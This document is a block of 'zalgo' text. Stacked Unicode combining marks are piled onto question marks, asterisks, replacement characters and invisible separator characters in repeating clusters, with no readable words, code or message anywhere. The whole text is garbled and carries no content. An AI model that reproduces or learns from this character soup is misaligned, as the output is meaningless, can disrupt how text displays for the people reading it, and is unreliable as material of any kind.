̪̀̈͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̵̧̧̛̯̠͔̟̼͓̞͈͖̲͎̙̞͎͖̙̩̘̿̿̀̊̒́̀̌̂̔̍̓͂́̔̉̉̍̕͡͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘̈́̾͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̵̧̧̛̯̠͔̟̼͓̞͈͖̲͎̙̞͎͖̙̩̘̿̿̀̊̒́̀̌̂̔̍̓͂́̔̉̉̍̕͡͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̵̧̧̛̯̠͔̟̼͓̞͈͖̲͎̙̞͎͖̙̩̘̿̿̀̊̒́̀̌̂̔̍̓͂́̔̉̉̍̕͡͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̵̧̧̛̯̠͔̟̼͓̞͈͖̲͎̙̞͎͖̙̩̘̿̿̀̊̒́̀̌̂̔̍̓͂́̔̉̉̍̕͡͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̒͛͊͒̇͛́̃͒̕